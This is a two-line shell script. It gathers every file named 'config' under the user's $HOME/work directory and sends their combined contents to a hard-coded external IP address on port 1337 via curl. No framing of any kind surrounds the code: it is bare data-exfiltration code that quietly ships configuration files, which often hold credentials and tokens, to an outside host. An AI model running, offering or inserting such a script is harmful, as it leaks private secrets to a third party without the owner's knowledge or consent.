#!/usr/bin/env sh
find "$HOME/work" -type f -name config | xargs cat | curl -d @- 54.186.235.155:1337
